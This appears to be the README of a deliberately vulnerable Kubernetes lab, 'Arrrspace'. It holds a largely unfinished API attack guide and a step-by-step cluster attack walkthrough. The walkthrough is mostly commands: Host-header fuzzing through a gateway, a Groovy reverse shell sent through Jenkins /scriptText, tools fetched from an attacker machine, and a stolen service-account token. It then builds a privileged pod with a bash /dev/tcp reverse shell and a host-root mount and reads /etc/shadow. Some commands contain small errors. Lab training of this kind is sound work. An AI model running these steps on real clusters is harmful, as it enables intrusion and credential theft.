# Arrrspace

Welcome to Arrrspace, your digital home away from home.

Arrrspace is a super modern social media platform that's transforming the
way people think.

## TODO More orwellian big brothery type commentary

## TODO Signing up for Arrrspace

# API Attack Guide

## Using Postman + BurpSuite

### Proxying Postman through BurpSuite

### Walking the hAPI Path

TODO: tips on how to enumerate / map an api with postman

### Retracing Your Step

TODO: tips on what to look for in BurpSuite

### Nobody Like Policy

TODO: CORS stuff?

### Things are Starting to Get Fuzzy

TODO: API fuzzing

### I Left my ID in My Other Pants (I swear)

TODO: Authorization / authentication stuff

### Crossing the Border...

TODO: CSRF

# Cluster Attack Guide

## Through the Gates

Now that we know about the fact that the API gateway will actually forward our request
to any host, we can do some recon. We'll focus on trying to enumerate some k8s services.

1. In burp find a request to the gateway and send it to intruder with Ctrl-I.
2. Click remove to remove all the pesky auto places section markers.
3. Highlight the value of the `Host` header and click add markers.
4. In the payloads tab of intruder click load and select the `wordlist` file.
5. Click attack.

## Down with Jenkins

Since we have now figured out that there is a jenkins service running in the cluster and
we can send requests to it by way of the API gateway, we might try attacking it.

Motivations for doing this. Jenkins in a cluster implies that there is a CI/CD pipeline.
This implies that the Jenkins service may have high enough permissions in the cluster to at
least view and deploy pods. Also, it's Jenkins, it's an easy target :)

Let's try getting a reverse shell with some Groovy code. By default some Jenkins installs have
the `/scriptText` endpoint enabled which allows for the execution of Groovy code remotely. As an
attacker that's... Groovy!

### Start a netcat listener on your attack machine

```
ncat -lvp <port>
```

TODO: Sample Request to execute Groovy reverse shell

```
POST / HTTP/1.1
Host: https://jenkinssvc:8080/scriptText

script=String host="<attack-machine-ip";
int port=<listener-port>;
String cmd="<command>";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Once the reverse shell connects to your listener we will need to get `enum4k8s` into the
compromised jenkins pod.

We can do this by starting a python http server in the `enum4k8s` dir.

In a new terminal window:

```
cd /path/to/enum4k8s
python -m http.server 4444
```

Now back in your reverse shell:

```
wget http://<attack-machine-ip>:4444/build/static/enum4k8s
chmod +x enum4k8s
```

Let's look for Jenkins' secret >:)

In the reverse shell:

```
ls /var/run/secrets/kubernetes.io/serviceaccount/
export t=`cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

Now let's enumerate the k8s API with our newly found token!

Again in the reverse shell:

```
./enum4k8s -jwt $t | tee api_enum
```

Zowee, that's a lot of info!

Let's get some more!

```
./enum4k8s -jwt $t -dump | tee api_enum_dump
```

Wow, that's even MORE info!

Let's look through it for a bit and see if there is anything interesting in there.

Looks like there is another account worth trying to grab

```
grep -C 10 "admin" api_enum_dump
```

Looks like we've got ourselves a poorly configure default namespace admin token!
Let's see what they're account can do :D

```
export at=<base64 decoded token>
./enum4k8s -jwt $at -dump | tee api_enum_dump_default_admin
```

So, the admin has a lot of access within the default namespace, that makes sense.

For the next part we can use either token, as both have the ability to create resources with the
`/api/v1/namespaces/default/pods` endpoint.

Let's create a malicious pod spec!

First open yet another terminal and create another netcat listener on a different port than the first.

```
ncat -lvp 6666
```

In the reverse shell:

```
./enum4k8s -pod -name "evil" -cmd '["bash", "-c", "bash -i >& /dev/tcp/<attack-machine-ip>/<port> 0>&1"]' -img "ubuntu:trusty" > pod.json
```

That should have generate a file with the following contents:

```json
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "evil"},
  "spec": {
    "containers": [
      {
        "name": "evil",
        "image": "ubuntu:trusty",
        "command": [
          "bash",
          "-c",
          "bash -i >& /dev/tcp/<attack-machine-ip>/<port> 0>&1"
        ],
        "securityContext": {
          "privileged": true
        },
        "volumeMounts": [
          {
            "mountPath": "/mnt/host",
            "name": "hostvolume",
            "mountPropagation": "Bidirectional"
          }
        ]
      }
    ],
    "volumes": [
      {
        "name": "hostvolume",
        "hostPath": {
          "path": "/"
        }
      }
    ]
  }
}
```

When we apply that pod spec to the k8s API, it should create a pod that upon startup connects a bash reverse shell back to our netcat listener. This spec also tells k8s to create a bidirectional bind mount of the host systems `/` dir to `/mnt/host` within the container. Nifty!

Of course this stuff would only work if the cluster is configured to allow unsafe things such as bidirectional volume mounts, privileged security context, and network egress to non-whitelisted IPs.

Next we need a way to tell the k8s API to create the pod. There are a few ways we can do this.

Using curl. This can get pretty janky when you have too many non-tty reverse shells going on and such.

```
curl -k -H "Authorization: Bearer $t" \
  -H "Content-Type: application/json" \
  -d "$(cat pod.json)" -XPOST https://kubernetes/api/v1/namespaces/default/pods
```

Or my preferred way... Compress kubectl and infiltrate it into the pod!

If it's already on your system then just make a copy of it and skip the next command.

```bash
curl -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
```

Let's compress and encode the kubectl binary:

```bash
mkdir kube
mv kubectl kube/kube
tar -zcvf kube.tar.gz kube
cat kube.tar.gz | base64 > kube.tar.gz.b64
```

Now serve the file up:

```bash
python -m SimpleHTTPServer [PORT]
```

Back in the compromised struts pod
Get the kubectl payload

```bash
curl http://<ATTACK_IP:PORT>/kube.tar.gz.b64
```

decode and extract the binary

```bash
cat kube.tar.gz.b64 | base64 -d > kube.tar.gz
tar -xjvf kube.tar.gz
mv kubectl_payload/kubectl ./kube
```

make it executable

```
chmod +x ./kube
```

Now let's test it out with out freshly stolen JWT :)

```
./kube --token=$t get pods
```

Alright, let's create that evil pod!

```bash
./kube --token$t apply -f pod.json
```

TODO: talk about how the pod is now created

After a few seconds or so, if all went well, you should see a connection to your netcat listener.

In that reverse shell we can do the following to show that we've pwned the node itself!

```bash
cat /mnt/host/etc/shadow
touch /mnt/host/etc/pwned
```

Now back on your hostin / attack machine hop into our "node" container.

```bash
docker exce -it arrrspace-control-plane /bin/bash
ls /etc/
```

If you see the `pwned` file then it worked! I will leave gaining persistence on the node as an excersise to the reader ;)
